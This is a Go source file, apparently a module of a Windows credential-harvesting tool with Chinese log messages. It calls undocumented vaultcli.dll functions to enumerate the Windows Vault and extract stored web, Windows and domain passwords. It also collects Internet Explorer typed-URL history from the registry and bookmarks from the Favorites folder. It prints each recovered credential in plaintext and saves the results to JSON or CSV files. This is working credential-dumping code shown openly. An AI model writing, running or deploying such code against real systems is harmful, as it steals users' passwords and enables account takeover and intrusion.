package browers

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	VAULT_ENUMERATE_ALL_ITEMS = 512
)

type VAULT_ITEM_WIN7 struct {
	SchemaId                  windows.GUID
	pszCredentialFriendlyName string
	pResourceElement          uintptr
	pIdentityElement          uintptr
	pAuthenticatorElement     uintptr
	LastModified              uint64
	dwFlags                   uint32
	dwPropertiesCount         uint32
	pPropertyElements         uintptr
}

type VAULT_ITEM_WIN8 struct {
	SchemaId                  windows.GUID
	pszCredentialFriendlyName string
	pResourceElement          uintptr
	pIdentityElement          uintptr
	pAuthenticatorElement     uintptr
	pPackageSid               uintptr
	LastModified              uint64
	dwFlags                   uint32
	dwPropertiesCount         uint32
	pPropertyElements         uintptr
}

type VAULT_ITEM_ELEMENT struct {
	Type    uint32
	pszName *uint16
	Value   uintptr
}

var (
	vaultcli                 = windows.NewLazySystemDLL("vaultcli.dll")
	procVaultEnumerateVaults = vaultcli.NewProc("VaultEnumerateVaults")
	procVaultOpenVault       = vaultcli.NewProc("VaultOpenVault")
	procVaultEnumerateItems  = vaultcli.NewProc("VaultEnumerateItems")
	procVaultGetItem7        = vaultcli.NewProc("VaultGetItem")
	procVaultGetItem8        = vaultcli.NewProc("VaultGetItem")
)

func VaultEnumerateVaults(flags uint32, vaultCount *uint32, vaultGuidPtr *uintptr) (err error) {
	r1, _, e1 := procVaultEnumerateVaults.Call(
		uintptr(flags),
		uintptr(unsafe.Pointer(vaultCount)),
		uintptr(unsafe.Pointer(vaultGuidPtr)),
	)
	if r1 != 0 {
		if e1 != nil {
			err = e1
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func VaultOpenVault(vaultGuid *windows.GUID, flags uint32, vaultHandle *uintptr) (err error) {
	r1, _, e1 := procVaultOpenVault.Call(
		uintptr(unsafe.Pointer(vaultGuid)),
		uintptr(flags),
		uintptr(unsafe.Pointer(vaultHandle)),
	)
	if r1 != 0 {
		if e1 != nil {
			err = e1
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func VaultEnumerateItems(vaultHandle uintptr, flags uint32, itemCount *uint32, itemsPtr *uintptr) (err error) {
	r1, _, e1 := procVaultEnumerateItems.Call(
		vaultHandle,
		uintptr(flags),
		uintptr(unsafe.Pointer(itemCount)),
		uintptr(unsafe.Pointer(itemsPtr)),
	)
	if r1 != 0 {
		if e1 != nil {
			err = e1
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func VaultGetItem_WIN7(vaultHandle uintptr, schemaId *windows.GUID, resourceElement uintptr, identityElement uintptr, zero uintptr, flags uint32, passwordVaultItemPtr *uintptr) (err error) {
	r1, _, e1 := procVaultGetItem7.Call(
		vaultHandle,
		uintptr(unsafe.Pointer(schemaId)),
		resourceElement,
		identityElement,
		zero,
		uintptr(flags),
		uintptr(unsafe.Pointer(passwordVaultItemPtr)),
	)
	if r1 != 0 {
		if e1 != nil {
			err = e1
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func VaultGetItem_WIN8(vaultHandle uintptr, schemaId *windows.GUID, resourceElement uintptr, identityElement uintptr, packageSid uintptr, zero uintptr, flags uint32, passwordVaultItemPtr *uintptr) (err error) {
	r1, _, e1 := procVaultGetItem8.Call(
		vaultHandle,
		uintptr(unsafe.Pointer(schemaId)),
		resourceElement,
		identityElement,
		packageSid,
		zero,
		uintptr(flags),
		uintptr(unsafe.Pointer(passwordVaultItemPtr)),
	)
	if r1 != 0 {
		if e1 != nil {
			err = e1
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func GetVaultElementValue(vaultElementPtr uintptr) interface{} {
	if vaultElementPtr == 0 {
		return nil
	}

	element := (*VAULT_ITEM_ELEMENT)(unsafe.Pointer(vaultElementPtr))
	elementType := element.Type

	valuePtr := unsafe.Pointer(vaultElementPtr + 16)

	switch elementType {
	case 7:
		strPtr := *(*uintptr)(valuePtr)
		return windows.UTF16PtrToString((*uint16)(unsafe.Pointer(strPtr)))
	case 0:
		return *(*byte)(valuePtr) != 0
	case 1:
		return *(*int16)(valuePtr)
	case 2:
		return *(*uint16)(valuePtr)
	case 3:
		return *(*int32)(valuePtr)
	case 4:
		return *(*uint32)(valuePtr)
	case 5:
		return *(*float64)(valuePtr)
	case 6:
		return *(*windows.GUID)(valuePtr)
	case 12:
		sidPtr := *(*uintptr)(valuePtr)
		if sidPtr == 0 {
			return nil
		}

		var sidStr string
		sid := (*windows.SID)(unsafe.Pointer(sidPtr))
		sidStr = sid.String()
		return sidStr
	default:
		return nil
	}
}

func IE_history() (string, error) {
	var resultBuilder strings.Builder
	PrintVerbose("获取IE历史记录")

	header := []string{"URL"}
	data := [][]string{}

	fileName := filepath.Join(OutputDir, "IE_history")

	if err := os.MkdirAll(OutputDir, 0755); err != nil {
		return "", err
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Internet Explorer\TypedURLs`, registry.QUERY_VALUE)
	if err != nil {
		return "", err
	}
	defer key.Close()

	urls := make([]string, 26)

	for i := 1; i < 26; i++ {
		url, _, err := key.GetStringValue(fmt.Sprintf("url%d", i))
		if err == nil && url != "" {
			urls[i] = url
		}
	}

	for _, url := range urls {
		if url != "" {
			PrintSuccess(url, 1)
			data = append(data, []string{url})
			resultBuilder.WriteString(fmt.Sprintf("URL: %s\n", url))
		}
	}

	if Format == "json" {
		if err := WriteJSON(header, data, fileName); err != nil {
			return resultBuilder.String(), err
		}
	} else if Format == "csv" {
		if err := WriteCSV(header, data, fileName); err != nil {
			return resultBuilder.String(), err
		}
	}

	return resultBuilder.String(), nil
}

func IE_books() (string, error) {
	var resultBuilder strings.Builder
	PrintVerbose("获取IE书签")

	header := []string{"URL", "TITLE"}
	data := [][]string{}

	fileName := filepath.Join(OutputDir, "IE_bookmark")

	if err := os.MkdirAll(OutputDir, 0755); err != nil {
		return "", err
	}

	favoritesPath := filepath.Join(os.Getenv("USERPROFILE"), "Favorites")

	var urlFiles []string
	err := filepath.Walk(favoritesPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && strings.ToLower(filepath.Ext(path)) == ".url" {
			urlFiles = append(urlFiles, path)
		}
		return nil
	})

	if err != nil {
		return "", err
	}

	for _, urlFilePath := range urlFiles {
		if fileContent, err := os.ReadFile(urlFilePath); err == nil {
			content := string(fileContent)

			urlStart := strings.Index(content, "URL=")
			if urlStart != -1 {
				urlEnd := strings.Index(content[urlStart:], "\n")
				var url string
				if urlEnd != -1 {
					url = content[urlStart : urlStart+urlEnd]
				} else {
					url = content[urlStart:]
				}

				PrintSuccess(urlFilePath, 1)
				PrintSuccess(url, 1)
				data = append(data, []string{url, urlFilePath})
				resultBuilder.WriteString(fmt.Sprintf("URL: %s, Title: %s\n", url, urlFilePath))
			}
		}
	}

	if Format == "json" {
		if err := WriteJSON(header, data, fileName); err != nil {
			return resultBuilder.String(), err
		}
	} else if Format == "csv" {
		if err := WriteCSV(header, data, fileName); err != nil {
			return resultBuilder.String(), err
		}
	}

	return resultBuilder.String(), nil
}

func GetLogins() (string, error) {
	var resultBuilder strings.Builder
	PrintVerbose("获取IE凭据")

	header := []string{"Vault Type", "Resource", "Identity", "Credential", "LastModified", "PackageSid"}
	data := [][]string{}

	fileName := filepath.Join(OutputDir, "IE_password")

	if err := os.MkdirAll(OutputDir, 0755); err != nil {
		return "", err
	}

	osVersion := windows.RtlGetVersion()
	osIsWin8OrNewer := (osVersion.MajorVersion > 6) || (osVersion.MajorVersion == 6 && osVersion.MinorVersion >= 2)

	var vaultCount uint32
	var vaultGuidPtr uintptr
	err := VaultEnumerateVaults(0, &vaultCount, &vaultGuidPtr)
	if err != nil {
		return "", fmt.Errorf("无法枚举保管库: %v", err)
	}

	vaultSchema := map[string]string{
		"2F1A6504-0641-44CF-8BB5-3612D865F2E5": "Windows Secure Note",
		"3CCD5499-87A8-4B10-A215-608888DD3B55": "Windows Web Password Credential",
		"154E23D0-C644-4E6F-8CE6-5069272F999F": "Windows Credential Picker Protector",
		"4BF4C442-9B8A-41A0-B380-DD4A704DDB28": "Web Credentials",
		"77BC582B-F0A6-4E15-4E80-61736B6F3B29": "Windows Credentials",
		"E69D7838-91B5-4FC9-89D5-230D4D4CC2BC": "Windows Domain Certificate Credential",
		"3E0E35BE-1B77-43E7-B873-AED901B6275B": "Windows Domain Password Credential",
		"3C886FF3-2669-4AA2-A8FB-3F6759A77548": "Windows Extended Credential",
		"00000000-0000-0000-0000-000000000000": "",
	}

	guidAddr := vaultGuidPtr
	for i := uint32(0); i < vaultCount; i++ {

		vaultGuid := *(*windows.GUID)(unsafe.Pointer(guidAddr))
		guidAddr += unsafe.Sizeof(vaultGuid)

		vaultType := fmt.Sprintf("%v", vaultGuid)
		if name, ok := vaultSchema[strings.ToUpper(vaultType)]; ok && name != "" {
			vaultType = name
		}

		var vaultHandle uintptr
		err = VaultOpenVault(&vaultGuid, 0, &vaultHandle)
		if err != nil {
			continue
		}

		var vaultItemCount uint32
		var vaultItemPtr uintptr
		err = VaultEnumerateItems(vaultHandle, VAULT_ENUMERATE_ALL_ITEMS, &vaultItemCount, &vaultItemPtr)
		if err != nil || vaultItemCount == 0 {
			continue
		}

		itemAddr := vaultItemPtr
		for j := uint32(0); j < vaultItemCount; j++ {
			var schemaId windows.GUID
			var pResourceElement, pIdentityElement, pPackageSid, pAuthenticatorElement uintptr
			var lastModified uint64

			if osIsWin8OrNewer {
				item := (*VAULT_ITEM_WIN8)(unsafe.Pointer(itemAddr))
				schemaId = item.SchemaId
				pResourceElement = item.pResourceElement
				pIdentityElement = item.pIdentityElement
				pPackageSid = item.pPackageSid
				lastModified = item.LastModified

				var passwordVaultItem uintptr
				err = VaultGetItem_WIN8(vaultHandle, &schemaId, pResourceElement, pIdentityElement, pPackageSid, 0, 0, &passwordVaultItem)
				if err != nil {
					itemAddr += unsafe.Sizeof(*item)
					continue
				}

				passwordItem := (*VAULT_ITEM_WIN8)(unsafe.Pointer(passwordVaultItem))
				pAuthenticatorElement = passwordItem.pAuthenticatorElement
			} else {
				item := (*VAULT_ITEM_WIN7)(unsafe.Pointer(itemAddr))
				schemaId = item.SchemaId
				pResourceElement = item.pResourceElement
				pIdentityElement = item.pIdentityElement
				lastModified = item.LastModified

				var passwordVaultItem uintptr
				err = VaultGetItem_WIN7(vaultHandle, &schemaId, pResourceElement, pIdentityElement, 0, 0, &passwordVaultItem)
				if err != nil {
					itemAddr += unsafe.Sizeof(*item)
					continue
				}

				passwordItem := (*VAULT_ITEM_WIN7)(unsafe.Pointer(passwordVaultItem))
				pAuthenticatorElement = passwordItem.pAuthenticatorElement
			}

			cred := GetVaultElementValue(pAuthenticatorElement)
			if cred == nil {
				if osIsWin8OrNewer {
					itemAddr += unsafe.Sizeof(VAULT_ITEM_WIN8{})
				} else {
					itemAddr += unsafe.Sizeof(VAULT_ITEM_WIN7{})
				}
				continue
			}

			resource := GetVaultElementValue(pResourceElement)
			identity := GetVaultElementValue(pIdentityElement)

			var packageSid interface{}
			if osIsWin8OrNewer && pPackageSid != 0 {
				packageSid = GetVaultElementValue(pPackageSid)
			}

			lastModifiedTime := time.Unix(0, int64(lastModified)*100)

			PrintSuccess(fmt.Sprintf("Vault Type: %s", vaultType), 1)
			resultBuilder.WriteString(fmt.Sprintf("Vault Type: %s\n", vaultType))

			resourceStr := ""
			if resource != nil {
				resourceStr = fmt.Sprintf("%v", resource)
				PrintSuccess(fmt.Sprintf("Resource: %s", resourceStr), 1)
				resultBuilder.WriteString(fmt.Sprintf("Resource: %s\n", resourceStr))
			}

			identityStr := ""
			if identity != nil {
				identityStr = fmt.Sprintf("%v", identity)
				PrintSuccess(fmt.Sprintf("Identity: %s", identityStr), 1)
				resultBuilder.WriteString(fmt.Sprintf("Identity: %s\n", identityStr))
			}

			packageSidStr := ""
			if packageSid != nil {
				packageSidStr = fmt.Sprintf("%v", packageSid)
				PrintSuccess(fmt.Sprintf("PackageSid: %s", packageSidStr), 1)
				resultBuilder.WriteString(fmt.Sprintf("PackageSid: %s\n", packageSidStr))
			}

			credStr := fmt.Sprintf("%v", cred)
			PrintSuccess(fmt.Sprintf("Credential: %s", credStr), 1)
			resultBuilder.WriteString(fmt.Sprintf("Credential: %s\n", credStr))

			lastModifiedStr := lastModifiedTime.Format("2006-01-02 15:04:05")
			PrintSuccess(fmt.Sprintf("LastModified: %s", lastModifiedStr), 1)
			resultBuilder.WriteString(fmt.Sprintf("LastModified: %s\n", lastModifiedStr))

			data = append(data, []string{
				vaultType,
				resourceStr,
				identityStr,
				credStr,
				lastModifiedStr,
				packageSidStr,
			})

			if osIsWin8OrNewer {
				itemAddr += unsafe.Sizeof(VAULT_ITEM_WIN8{})
			} else {
				itemAddr += unsafe.Sizeof(VAULT_ITEM_WIN7{})
			}
		}
	}

	if Format == "json" {
		if err := WriteJSON(header, data, fileName); err != nil {
			return resultBuilder.String(), err
		}
	} else if Format == "csv" {
		if err := WriteCSV(header, data, fileName); err != nil {
			return resultBuilder.String(), err
		}
	}

	return resultBuilder.String(), nil
}

func GetIE() (string, error) {
	var resultBuilder strings.Builder
	resultBuilder.WriteString("========================== IE (Current User) ==========================\n")
	fmt.Println("========================== IE (Current User) ==========================")

	loginResult, err := GetLogins()
	if err != nil {
		fmt.Printf("获取IE凭据失败: %v\n", err)
	} else {
		resultBuilder.WriteString(loginResult)
	}

	bookmarkResult, err := IE_books()
	if err != nil {
		fmt.Printf("获取IE书签失败: %v\n", err)
	} else {
		resultBuilder.WriteString(bookmarkResult)
	}

	historyResult, err := IE_history()
	if err != nil {
		fmt.Printf("获取IE历史记录失败: %v\n", err)
	} else {
		resultBuilder.WriteString(historyResult)
	}

	return resultBuilder.String(), nil
}
